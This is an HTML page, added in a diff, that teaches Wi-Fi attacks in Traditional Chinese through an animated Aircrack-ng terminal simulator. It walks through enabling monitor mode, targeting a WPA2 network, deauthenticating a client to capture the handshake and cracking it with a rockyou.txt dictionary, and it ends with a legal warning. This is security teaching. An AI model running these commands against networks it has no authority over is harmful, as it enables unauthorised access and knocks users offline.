@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aircrack-ng 無線攻擊 | 資安模擬學習</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        /* --- 1. Aircrack 主題美術風格 (Radar Green) --- */
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Consolas', 'Monaco', 'Courier New', monospace; }
+        body { line-height: 1.6; color: #ccffcc; background-color: #001100; position: relative; overflow-x: hidden; font-family: 'Segoe UI', sans-serif; }
+
+        /* 背景特效：雷達掃描 */
+        .radar-background {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
+            background: 
+                radial-gradient(circle, transparent 20%, #002200 21%, #002200 22%, transparent 23%),
+                radial-gradient(circle, transparent 40%, #002200 41%, #002200 42%, transparent 43%),
+                radial-gradient(circle, transparent 60%, #002200 61%, #002200 62%, transparent 63%);
+            background-size: 100% 100%;
+        }
+        
+        .radar-sweep {
+            position: fixed; top: 50%; left: 50%; width: 100vw; height: 100vw;
+            transform: translate(-50%, -50%);
+            background: conic-gradient(from 0deg, transparent 0deg, rgba(57, 255, 20, 0.1) 60deg, transparent 60deg);
+            border-radius: 50%;
+            animation: radarSpin 4s linear infinite; z-index: -1;
+        }
+
+        @keyframes radarSpin { from { transform: translate(-50%, -50%) rotate(0deg); } to { transform: translate(-50%, -50%) rotate(360deg); } }
+
+        /* 容器 */
+        .container { width: 90%; max-width: 1400px; margin: 0 auto; padding: 20px; position: relative; }
+
+        /* 頁首 */
+        header {
+            background: rgba(0, 20, 0, 0.95); padding: 4rem 0; text-align: center; margin-bottom: 2rem;
+            border-radius: 4px; border: 1px solid #39ff14; box-shadow: 0 0 25px rgba(57, 255, 20, 0.2);
+            position: relative; overflow: hidden;
+        }
+        header h1 {
+            font-size: 2.8rem; margin-bottom: 1rem; color: #39ff14;
+            text-shadow: 0 0 15px rgba(57, 255, 20, 0.6); letter-spacing: 2px;
+        }
+        header p { font-size: 1.2rem; color: #88ff88; max-width: 800px; margin: 0 auto; }
+
+        /* 導覽列 */
+        nav {
+            background: #001a00; padding: 1rem; border-radius: 4px; border: 1px solid #39ff14;
+            position: sticky; top: 0; z-index: 100; margin-bottom: 30px; box-shadow: 0 5px 15px rgba(0,0,0,0.8);
+        }
+        nav ul { display: flex; justify-content: center; list-style: none; gap: 20px; flex-wrap: wrap; }
+        nav a {
+            text-decoration: none; color: #88ff88; font-weight: bold; padding: 8px 16px;
+            border-radius: 2px; transition: 0.3s; border: 1px solid transparent;
+        }
+        nav a:hover { background: rgba(57, 255, 20, 0.15); color: #39ff14; border-color: #39ff14; }
+
+        /* --- 佈局 --- */
+        .grid-layout { display: grid; grid-template-columns: 2fr 1fr; gap: 30px; margin-bottom: 40px; }
+        .full-width { width: 100%; margin-bottom: 2rem; }
+        @media (max-width: 1024px) { .grid-layout { grid-template-columns: 1fr; } }
+
+        /* 區塊樣式 */
+        article {
+            background: rgba(0, 15, 0, 0.9); padding: 30px; border-radius: 4px; border: 1px solid #004400; margin-bottom: 30px;
+        }
+        
+        h2 { color: #39ff14; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid #004400; font-size: 1.8rem; display: flex; align-items: center; gap: 10px; }
+        h3 { color: #00cc00; margin: 25px 0 15px 0; font-size: 1.4rem; }
+        p, li { margin-bottom: 10px; color: #ccffcc; font-size: 1.05rem; }
+        ul { margin-left: 20px; list-style-type: square; }
+        li::marker { color: #39ff14; }
+
+        /* 側邊欄 */
+        aside {
+            background: rgba(0, 15, 0, 0.9); padding: 25px; border-radius: 4px; border: 1px solid #39ff14;
+            height: fit-content; position: sticky; top: 100px;
+        }
+
+        /* 提示框 */
+        .info-box { background: rgba(57, 255, 20, 0.05); border-left: 4px solid #39ff14; padding: 1rem; margin-bottom: 1.5rem; }
+        .danger-box { background: rgba(255, 0, 0, 0.1); border-left: 4px solid #ff3333; padding: 1rem; margin-bottom: 1.5rem; }
+
+        /* --- 模擬器樣式 (Terminal Style) --- */
+        .simulator-wrapper {
+            background: #000; border: 2px solid #39ff14; border-radius: 4px; overflow: hidden;
+            box-shadow: 0 0 30px rgba(57, 255, 20, 0.15); margin: 20px 0;
+            display: flex; flex-direction: column; height: 750px;
+        }
+
+        .sim-header {
+            background: #001a00; padding: 10px 15px; border-bottom: 1px solid #39ff14;
+            display: flex; justify-content: space-between; align-items: center; color: #39ff14; font-family: monospace;
+        }
+
+        .sim-grid {
+            display: grid; grid-template-columns: 240px 1fr 340px; flex: 1; overflow: hidden;
+        }
+
+        /* 控制區 */
+        .sim-controls { background: #050a05; border-right: 1px solid #004400; padding: 15px; overflow-y: auto; }
+        .sim-btn {
+            width: 100%; padding: 15px; margin-bottom: 12px; background: rgba(57, 255, 20, 0.05); border: 1px solid #004400;
+            color: #88ff88; text-align: left; cursor: pointer; border-radius: 2px; transition: all 0.2s; font-family: monospace;
+        }
+        .sim-btn:hover { background: rgba(57, 255, 20, 0.15); color: #fff; border-color: #39ff14; }
+        .sim-btn.active { background: rgba(57, 255, 20, 0.25); border-color: #39ff14; color: #fff; border-left: 4px solid #39ff14; box-shadow: 0 0 10px rgba(57, 255, 20, 0.2); }
+        .sim-btn strong { display: block; font-size: 1rem; margin-bottom: 4px; }
+
+        /* 終端機 */
+        .sim-terminal {
+            background: #000; padding: 0; display: flex; flex-direction: column; 
+            font-family: 'Consolas', 'Courier New', monospace; position: relative;
+        }
+        .term-body { 
+            flex: 1; padding: 20px; overflow-y: auto; color: #ccc; 
+            font-size: 0.95rem; line-height: 1.4; white-space: pre-wrap; 
+        }
+        .prompt { color: #ff00ea; font-weight: bold; margin-right: 8px; }
+        .cursor { display: inline-block; width: 10px; height: 18px; background: #39ff14; animation: blink 1s infinite; vertical-align: text-bottom; }
+
+        /* 解析區 */
+        .sim-decoder { background: #051005; border-left: 1px solid #004400; display: flex; flex-direction: column; }
+        .decoder-header { padding: 15px; background: #001a00; border-bottom: 1px solid #004400; color: #39ff14; font-weight: bold; }
+        .decoder-content { padding: 20px; flex: 1; overflow-y: auto; }
+        
+        .explanation-card { 
+            background: rgba(57, 255, 20, 0.05); border-left: 3px solid #39ff14; 
+            padding: 15px; border-radius: 2px; animation: slideIn 0.3s ease; margin-bottom: 15px;
+        }
+        .analogy { 
+            margin-top: 10px; padding: 10px; background: rgba(255, 255, 255, 0.05); 
+            border-radius: 2px; color: #88ff88; font-style: italic; border: 1px dashed #004400;
+        }
+
+        /* 重置按鈕 */
+        .reset-btn {
+            background: transparent; border: 1px solid #39ff14; color: #39ff14; 
+            padding: 4px 12px; font-size: 0.8rem; cursor: pointer; transition: 0.3s;
+            font-family: monospace; text-transform: uppercase;
+        }
+        .reset-btn:hover { background: #39ff14; color: #000; }
+
+        /* [新增] 工具卡片樣式 */
+        .tool-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px;
+        }
+        .tool-card {
+            background: rgba(0, 34, 0, 0.6); border: 1px solid #39ff14; padding: 20px;
+            border-radius: 4px; transition: transform 0.3s;
+        }
+        .tool-card:hover { transform: translateY(-5px); background: rgba(0, 51, 0, 0.8); }
+        .tool-title { color: #39ff14; font-size: 1.2rem; font-weight: bold; margin-bottom: 10px; border-bottom: 1px solid #004400; padding-bottom: 5px; }
+        .tool-title i { margin-right: 10px; }
+        .tool-desc { font-size: 0.95rem; color: #ccffcc; margin-bottom: 0; }
+
+        @keyframes blink { 50% { opacity: 0; } }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* RWD */
+        @media (max-width: 900px) { .sim-grid { grid-template-columns: 1fr; grid-template-rows: auto 400px auto; } .sim-decoder { border-left: none; border-top: 1px solid #004400; height: 300px; } }
+    </style>
+</head>
+<body>
+
+    <div class="radar-background"></div>
+    <div class="radar-sweep"></div>
+
+    <header>
+        <div class="container">
+            <h1><i class="fas fa-wifi"></i> Aircrack-ng 無線攻擊</h1>
+            <p>WiFi 滲透測試的瑞士軍刀 • 監聽、抓包、破解一氣呵成</p>
+        </div>
+    </header>
+
+    <nav>
+        <div class="container">
+            <ul>
+                <li><a href="#intro">工具介紹</a></li>
+                <li><a href="#install">安裝指令</a></li>
+                <li><a href="#simulation">無線滲透演示</a></li>
+                <li><a href="#suite">工具組介紹</a></li>
+                <li><a href="#ethics">法律規範</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="container">
+        
+        <div class="grid-layout">
+            <div class="content-left">
+                <article id="intro">
+                    <h2><i class="fas fa-broadcast-tower"></i> 什麼是 Aircrack-ng？</h2>
+                    
+                    <p><strong>Aircrack-ng</strong> 不是一個單一的程式，而是一套完整的無線網路安全評估工具組。</p>
+                    <p>它能夠將無線網卡切換到「監聽模式 (Monitor Mode)」，攔截空氣中的 WiFi 封包，並對 WEP、WPA、WPA2 加密進行攻擊與破解。它是每一位想要學習無線安全的駭客必修課。</p>
+                    
+                    <div class="info-box">
+                        <p><strong><i class="fas fa-key"></i> 核心目標：</strong></p>
+                        <ul>
+                            <li><strong>監聽 (Monitor)</strong>：捕獲所有無線流量。</li>
+                            <li><strong>攻擊 (Attack)</strong>：斷線攻擊、假基地台。</li>
+                            <li><strong>破解 (Crack)</strong>：暴力破解 WiFi 密碼。</li>
+                        </ul>
+                    </div>
+                </article>
+
+                <article id="install">
+                    <h2><i class="fas fa-download"></i> 安裝與硬體需求</h2>
+                    <p>Aircrack-ng 內建於 Kali Linux。但你最需要的是一張<strong>支援監聽模式</strong>的 USB 無線網卡。</p>
+                    <pre><code style="color:#39ff14;"># 安裝 (若未安裝)
+sudo apt install aircrack-ng
+
+# 檢查網卡是否支援
+iw list</code></pre>
+                </article>
+            </div>
+
+            <aside>
+                <div style="margin-bottom: 30px;">
+                    <h3 style="margin-top:0; border-bottom:1px solid #004400; padding-bottom:10px;">
+                        <i class="fas fa-laptop-code"></i> 實驗配置
+                    </h3>
+                    <ul style="list-style: none; margin: 0; padding: 0;">
+                        <li style="padding: 10px 0; border-bottom: 1px solid #004400;">
+                            <i class="fas fa-check" style="color:#39ff14; margin-right:8px;"></i> 系統: Kali Linux (Root)
+                        </li>
+                        <li style="padding: 10px 0; border-bottom: 1px solid #004400;">
+                            <i class="fas fa-wifi" style="color:#39ff14; margin-right:8px;"></i> 網卡: wlan0 (支援 Monitor)
+                        </li>
+                        <li style="padding: 10px 0; border-bottom: 1px solid #004400;">
+                            <i class="fas fa-bullseye" style="color:#39ff14; margin-right:8px;"></i> 目標: Home_WiFi (WPA2)
+                        </li>
+                        <li style="padding: 10px 0;">
+                            <i class="fas fa-file-alt" style="color:#00cc00; margin-right:8px;"></i> 字典: rockyou.txt
+                        </li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 style="margin-top:0; border-bottom:1px solid #004400; padding-bottom:10px;">
+                        <i class="fas fa-book"></i> 章節導覽
+                    </h3>
+                    <ul style="list-style: none; margin: 0; padding: 0;">
+                        <li style="padding: 8px 0;"><a href="#intro" style="color:#88ff88; text-decoration:none;">1. 工具介紹</a></li>
+                        <li style="padding: 8px 0;"><a href="#install" style="color:#88ff88; text-decoration:none;">2. 安裝指令</a></li>
+                        <li style="padding: 8px 0;"><a href="#simulation" style="color:#88ff88; text-decoration:none;">3. 無線滲透演示</a></li>
+                        <li style="padding: 8px 0;"><a href="#suite" style="color:#88ff88; text-decoration:none;">4. 工具組介紹</a></li>
+                        <li style="padding: 8px 0;"><a href="#ethics" style="color:#88ff88; text-decoration:none;">5. 法律規範</a></li>
+                    </ul>
+                </div>
+            </aside>
+        </div>
+
+        <div class="full-width">
+            <article id="simulation" style="border: 2px solid #39ff14; box-shadow: 0 0 30px rgba(57, 255, 20, 0.1);">
+                <h2><i class="fas fa-satellite-dish"></i> 互動虛擬實驗室</h2>
+                <p>我們將模擬破解一個 WPA2 加密的 WiFi 網路。過程包含：開啟監聽、掃描目標、強制斷線抓取握手包、暴力破解。</p>
+                
+                <div class="simulator-wrapper">
+                    <div class="sim-header">
+                        <div><i class="fas fa-terminal"></i> KALI ROOT TERMINAL</div>
+                        <button class="reset-btn" onclick="resetSim()">
+                            <i class="fas fa-redo"></i> 重置模擬器
+                        </button>
+                    </div>
+
+                    <div class="sim-grid">
+                        <div class="sim-controls">
+                            <button class="sim-btn" onclick="runStep(1)" id="btn-1">
+                                <strong>Step 1: 變身監聽模式</strong><span>airmon-ng start wlan0</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(2)" id="btn-2">
+                                <strong>Step 2: 掃描附近 WiFi</strong><span>airodump-ng wlan0mon</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(3)" id="btn-3">
+                                <strong>Step 3: 鎖定目標監聽</strong><span>airodump-ng -c 6 ...</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(4)" id="btn-4">
+                                <strong>Step 4: 斷線攻擊 (踢人)</strong><span>aireplay-ng --deauth</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(5)" id="btn-5" style="border-left: 3px solid #ffff00; background: rgba(255,255,0,0.05);">
+                                <strong style="color:#ffff00;">Step 5: 抓到握手包!</strong><span>[ WPA handshake ]</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(6)" id="btn-6" style="border-left: 3px solid #ff3333; background: rgba(255,0,0,0.05);">
+                                <strong style="color:#ff3333;">Step 6: 暴力破解密碼</strong><span>aircrack-ng -w rockyou</span>
+                            </button>
+                        </div>
+
+                        <div class="sim-terminal">
+                            <div class="term-body" id="term-body">
+                                <div>Kali GNU/Linux Rolling [Version 2024.1]</div>
+                                <br>
+                                <div id="prompt-line" style="display:flex; flex-wrap:wrap;">
+                                    <span class="prompt" id="prompt-text">root@kali:~#</span>
+                                    <span id="typing-area"></span><span class="cursor"></span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="sim-decoder">
+                            <div class="decoder-header"><i class="fas fa-file-code"></i> 戰術解析面板</div>
+                            <div class="decoder-content" id="decoder-content">
+                                <div style="text-align: center; color: #88ff88; margin-top: 100px;">
+                                    <i class="fas fa-wifi fa-3x" style="margin-bottom: 20px;"></i><br>
+                                    天線準備就緒<br>點擊左側 <strong>Step 1</strong> 開始操作
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+        </div>
+
+        <div class="grid-layout">
+            
+            <div class="content-left">
+                <article id="suite">
+                    <h2><i class="fas fa-toolbox"></i> Aircrack-ng 家族成員</h2>
+                    <p>這個套件包含多個工具，各司其職，以下是核心四大金剛：</p>
+                    
+                    <div class="tool-grid">
+                        <div class="tool-card">
+                            <div class="tool-title"><i class="fas fa-sliders-h"></i> airmon-ng</div>
+                            <p class="tool-desc">配置工具。負責將無線網卡從一般的「管理模式」切換成「監聽模式」，開啟接收所有訊號的能力。</p>
+                        </div>
+                        <div class="tool-card">
+                            <div class="tool-title"><i class="fas fa-radar"></i> airodump-ng</div>
+                            <p class="tool-desc">嗅探工具。負責掃描附近的 WiFi 基地台，顯示頻道、加密方式，並負責抓取握手包 (Handshake)。</p>
+                        </div>
+                        <div class="tool-card">
+                            <div class="tool-title"><i class="fas fa-bolt"></i> aireplay-ng</div>
+                            <p class="tool-desc">注入工具。負責主動攻擊，例如發送斷線封包 (Deauth) 強迫使用者斷線，以誘發重新連線。</p>
+                        </div>
+                        <div class="tool-card">
+                            <div class="tool-title"><i class="fas fa-unlock-alt"></i> aircrack-ng</div>
+                            <p class="tool-desc">破解工具。不需要網路連線，利用 CPU/GPU 的算力，配合字典檔暴力破解抓到的握手包。</p>
+                        </div>
+                    </div>
+                </article>
+            </div>
+
+            <div class="content-right">
+                <article id="ethics">
+                    <h2><i class="fas fa-gavel"></i> 法律與道德</h2>
+                    
+                    <div class="danger-box">
+                        <h3><i class="fas fa-exclamation-triangle"></i> 絕對禁止</h3>
+                        <p>破解他人的 WiFi 密碼屬於<strong>妨害電腦使用罪 (刑法第 358 條)</strong>，並可能涉及<strong>竊取電信服務罪</strong>。</p>
+                    </div>
+
+                    <div style="margin-bottom:20px;">
+                        <h4 style="color:#39ff14; margin-bottom:10px;">合法使用範圍</h4>
+                        <ul>
+                            <li>測試自己家裡的 WiFi</li>
+                            <li>企業授權的無線安全審計</li>
+                        </ul>
+                    </div>
+
+                    <div class="info-box" style="text-align: center;">
+                        <h4 style="margin-top: 0; color: #fff;">資安倫理</h4>
+                        <p>不要偷連隔壁的 WiFi。</p>
+                        <p style="color: #39ff14; font-weight: bold; margin-top: 10px;">
+                            Only Hack Your Own Network.
+                        </p>
+                    </div>
+                </article>
+            </div>
+        </div>
+
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>© 2025 Aircrack-ng 無線攻擊 | 僅供資安教育用途</p>
+            <p>請務必遵守法律與道德規範</p>
+        </div>
+    </footer>
+
+    <script>
+        const termBody = document.getElementById('term-body');
+        const promptLine = document.getElementById('prompt-line');
+        const promptText = document.getElementById('prompt-text');
+        const typingArea = document.getElementById('typing-area');
+        const decoderContent = document.getElementById('decoder-content');
+        
+        let isTyping = false;
+        let typingTimer = null;
+        let currentPromptStr = "root@kali:~#";
+
+        // 模擬數據
+        const scenarios = {
+            1: {
+                cmd: "airmon-ng start wlan0",
+                info: `
+                    <div class="explanation-card">
+                        <h4>Step 1: 開啟監聽模式 (Monitor Mode)</h4>
+                        <p style="color:#ccc;">一般的網卡只會接收「發給自己」的封包。我們必須開啟監聽模式，才能接收「空中所有」的封包。</p>
+                        <p style="color:#ccc;">指令執行後，網卡名稱通常會變成 <code>wlan0mon</code>。</p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>把無線電從「只聽自選頻道」切換成「全頻段掃描」，現在你可以聽到周圍所有的聲音了。
+                        </div>
+                    </div>`,
+                output: [
+                    { text: "Found 2 processes that could cause trouble.", wait: 500 },
+                    { text: "Kill them using 'airmon-ng check kill' before putting", wait: 600 },
+                    { text: "the card in monitor mode, they will interfere by changing channels.", wait: 700 },
+                    { text: "PHY     Interface       Driver          Chipset", color: "#39ff14", wait: 1000 },
+                    { text: "phy0    wlan0           ath9k_htc       Atheros AR9271", wait: 1200 },
+                    { text: "\n(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)", wait: 1500 },
+                    { text: "\n(mac80211 station mode vif disabled for [phy0]wlan0)", wait: 1600 },
+                    { text: "root@kali:~#", type: "prompt", wait: 2000 }
+                ]
+            },
+            2: {
+                cmd: "airodump-ng wlan0mon",
+                info: `
+                    <div class="explanation-card">
+                        <h4>Step 2: 掃描環境 (Discovery)</h4>
+                        <p style="color:#ccc;">這是雷達掃描階段。我們可以看到附近所有的 WiFi 基地台 (BSSID) 和連線中的裝置 (Station)。</p>
+                        <p style="color:#ccc;">我們發現了一個目標：<strong>Home_WiFi</strong> (CH 6)。</p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>你打開雷達，螢幕上出現了好多光點。你知道了隔壁鄰居的 WiFi 叫什麼名字，在哪個頻道發送訊號。
+                        </div>
+                    </div>`,
+                output: [
+                    { text: " CH  6 ][ Elapsed: 12 s ][ 2024-05-20 10:00 ", style: "background:#39ff14; color:#000;", wait: 500 },
+                    { text: "\n BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID", color: "#39ff14", wait: 800 },
+                    { text: " AA:BB:CC:DD:EE:FF  -50       10        2    0   6  54e  WPA2 CCMP   PSK  Home_WiFi", color: "#fff", wait: 1200 },
+                    { text: " 11:22:33:44:55:66  -75        5        0    0   1  54e  WPA2 CCMP   PSK  Starbucks", color: "#888", wait: 1400 },
+                    { text: "\n BSSID              STATION            PWR   Rate    Lost    Frames  Probe", color: "#39ff14", wait: 1600 },
+                    { text: " AA:BB:CC:DD:EE:FF  00:11:22:33:44:55  -40    1e- 1    0       50    Home_WiFi", color: "#fff", wait: 1800 },
+                    { text: "^C", wait: 2200 },
+                    { text: "root@kali:~#", type: "prompt", wait: 2500 }
+                ]
+            },
+            3: {
+                cmd: "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon",
+                info: `
+                    <div class="explanation-card">
+                        <h4>Step 3: 鎖定目標監聽 (Targeting)</h4>
+                        <p style="color:#ccc;">我們鎖定頻道 6 的目標基地台，並把抓到的封包存成檔案 (capture)。</p>
+                        <p style="color:#ccc;">現在我們專心等待「握手包」的出現。</p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>你把望遠鏡的焦點對準了「Home_WiFi」這戶人家，並且架好了錄影機，準備錄下關鍵畫面。
+                        </div>
+                    </div>`,
+                output: [
+                    { text: " CH  6 ][ Elapsed: 4 s ][ 2024-05-20 10:01 ][ WPA handshake: ]", style: "background:#000; color:#39ff14; border:1px solid #39ff14;", wait: 500 },
+                    { text: " BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID", color: "#39ff14", wait: 800 },
+                    { text: " AA:BB:CC:DD:EE:FF  -48 100       45       12    2   6  54e  WPA2 CCMP   PSK  Home_WiFi", color: "#fff", wait: 1200 },
+                    { text: " BSSID              STATION            PWR   Rate    Lost    Frames  Probe", color: "#39ff14", wait: 1500 },
+                    { text: " AA:BB:CC:DD:EE:FF  00:11:22:33:44:55  -42    1e- 1    0       12    Home_WiFi", color: "#fff", wait: 1800 },
+                    { text: "(Listening...)", color: "#888", wait: 2000 }
+                ]
+            },
+            4: {
+                cmd: "aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 00:11:22:33:44:55 wlan0mon",
+                info: `
+                    <div class="explanation-card">
+                        <h4>Step 4: 斷線攻擊 (Deauthentication)</h4>
+                        <p style="color:#ccc;">為了不用傻傻等待，我們發送「取消認證封包」給連線中的裝置。</p>
+                        <p style="color:#ccc;">這會強制裝置斷線。當裝置**自動重新連線**時，就會發送我們需要的握手包。</p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>你在旁邊大吼大叫製造噪音，逼得講電話的人聽不清楚只好「掛斷重打」。就在他重打的那一瞬間，你錄下了通話的開頭暗號。
+                        </div>
+                    </div>`,
+                output: [
+                    { text: "10:02:00  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 6", wait: 500 },
+                    { text: "10:02:01  Sending 64 directed DeAuth. STMAC: [00:11:22:33:44:55] [ 12| 10 ACKs]", wait: 800 },
+                    { text: "10:02:02  Sending 64 directed DeAuth. STMAC: [00:11:22:33:44:55] [ 45| 60 ACKs]", wait: 1100 },
+                    { text: "10:02:03  Sending 64 directed DeAuth. STMAC: [00:11:22:33:44:55] [ 10| 32 ACKs]", wait: 1400 },
+                    { text: "root@kali:~#", type: "prompt", wait: 1800 }
+                ]
+            },
+            5: {
+                cmd: "", // 被動觸發
+                info: `
+                    <div class="explanation-card" style="border-color:#ffff00; background:rgba(255,255,0,0.1);">
+                        <h4 style="color:#ffff00;">Step 5: 抓到握手包! (Handshake Captured)</h4>
+                        <p style="color:#ccc;">看看右上方！出現了 <strong>[ WPA handshake: AA:BB... ]</strong>。</p>
+                        <p style="color:#ccc;">這就是密碼的「加密雜湊值」。我們現在可以停止監聽，回家開始破解了。</p>
+                        <div class="analogy">
+                            <strong>🎉 任務達成：</strong>你錄到了！你錄到了他們接通電話時說的「通關密語」。雖然這密語是加密的，但有了它，我們就能算出密碼。
+                        </div>
+                    </div>`,
+                output: [
+                    { text: " CH  6 ][ Elapsed: 1 m ][ 2024-05-20 10:02 ][ WPA handshake: AA:BB:CC:DD:EE:FF ]", style: "background:#000; color:#39ff14; border:1px solid #ffff00; font-weight:bold;", wait: 500 },
+                    { text: "^C", wait: 1000 },
+                    { text: "root@kali:~#", type: "prompt", wait: 1200 }
+                ]
+            },
+            6: {
+                cmd: "aircrack-ng -w rockyou.txt capture-01.cap",
+                info: `
+                    <div class="explanation-card" style="border-color:#ff3333; background:rgba(255,0,0,0.1);">
+                        <h4 style="color:#ff3333;">Step 6: 暴力破解 (Cracking)</h4>
+                        <p style="color:#ccc;">使用 <code>rockyou.txt</code> 字典檔對抓到的握手包進行破解。</p>
+                        <p style="color:#ccc;">Aircrack 會高速嘗試每一個密碼。如果密碼在字典裡，就會顯示 <strong>KEY FOUND!</strong></p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>回家後，你拿出一本厚厚的字典，開始一個字一個字對照剛剛錄到的通關密語。只要字典裡有這個詞，你就破譯成功了。
+                        </div>
+                    </div>`,
+                output: [
+                    { text: "Opening capture-01.cap", wait: 300 },
+                    { text: "Reading file capture-01.cap", wait: 500 },
+                    { text: "1 potential targets", wait: 600 },
+                    { text: "                                 Aircrack-ng 1.6", style: "text-align:center; color:#fff;", wait: 800 },
+                    { text: "[00:00:03] 4532 keys tested (1450.00 k/s)", wait: 1200 },
+                    { text: "KEY FOUND! [ 12345678 ]", style: "background:#39ff14; color:#000; font-weight:bold; font-size:1.2rem; display:block; padding:5px;", wait: 1800 },
+                    { text: "\nMaster Key     : D4 1D 8C D9 8F 00 B2 04 E9 80 09 98 EC F8 42 7E", wait: 2200 },
+                    { text: "Transient Key  : 9A 5B 12 4C 8D 3E 2F 1A 7B 6C 5D 4E 3F 2A 1B 0C", wait: 2400 },
+                    { text: "root@kali:~#", type: "prompt", wait: 2800 }
+                ]
+            }
+        };
+
+        // 執行步驟
+        function runStep(id) {
+            if (isTyping) return;
+            isTyping = true;
+            
+            const data = scenarios[id];
+            document.querySelectorAll('.sim-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById('btn-' + id).classList.add('active');
+
+            if (id === 5) {
+                // Step 5 是被動觸發，不用打字
+                addHistoryLog("", "(Listening for handshake...)");
+                processOutput(data);
+            } else {
+                typeCommand(data.cmd, () => {
+                    addHistoryLog(currentPromptStr, data.cmd);
+                    processOutput(data);
+                });
+            }
+        }
+
+        function processOutput(data) {
+            decoderContent.innerHTML = data.info;
+            let maxWait = 0;
+            if(data.output) {
+                data.output.forEach(line => {
+                    setTimeout(() => {
+                        if(line.type === 'prompt') {
+                            updatePrompt(line.text);
+                        } else {
+                            printText(line.text, line.color, line.style);
+                        }
+                    }, line.wait);
+                    if(line.wait > maxWait) maxWait = line.wait;
+                });
+            }
+            setTimeout(() => {
+                isTyping = false;
+            }, maxWait + 200);
+        }
+
+        // 打字動畫
+        function typeCommand(text, callback) {
+            typingArea.textContent = "";
+            let i = 0;
+            typingTimer = setInterval(() => {
+                typingArea.textContent += text.charAt(i);
+                i++;
+                if (i >= text.length) {
+                    clearInterval(typingTimer);
+                    setTimeout(() => {
+                        typingArea.textContent = ""; 
+                        callback();
+                    }, 300);
+                }
+            }, 30);
+        }
+
+        function addHistoryLog(p, c) {
+            const div = document.createElement('div');
+            div.innerHTML = `<span class="prompt">${p}</span> ${c}`;
+            termBody.insertBefore(div, promptLine);
+            scrollToBottom();
+        }
+
+        function printText(text, color, style) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            if(color) div.style.color = color;
+            if(style) div.setAttribute('style', `color:${color}; ${style}`);
+            termBody.insertBefore(div, promptLine);
+            scrollToBottom();
+        }
+
+        function updatePrompt(text) {
+            currentPromptStr = text;
+            promptText.textContent = text;
+            scrollToBottom();
+        }
+
+        function scrollToBottom() {
+            termBody.scrollTop = termBody.scrollHeight;
+        }
+
+        function resetSim() {
+            if(isTyping) return;
+            const logs = termBody.querySelectorAll('div:not(#prompt-line)');
+            for(let i=1; i<logs.length; i++) logs[i].remove();
+            
+            const welcome1 = document.createElement('div');
+            welcome1.textContent = "Kali GNU/Linux Rolling [Version 2024.1]";
+            termBody.insertBefore(welcome1, promptLine);
+            const br = document.createElement('div');
+            br.innerHTML = "<br>";
+            termBody.insertBefore(br, promptLine);
+
+            updatePrompt("root@kali:~#");
+            typingArea.textContent = "";
+
+            decoderContent.innerHTML = `
+                <div style="text-align: center; color: #88ff88; margin-top: 100px;">
+                    <i class="fas fa-wifi fa-3x" style="margin-bottom: 20px;"></i><br>
+                    天線準備就緒<br>點擊左側 <strong>Step 1</strong> 開始操作
+                </div>`;
+            document.querySelectorAll('.sim-btn').forEach(b => b.classList.remove('active'));
+        }
+    </script>
+</body>
+</html>
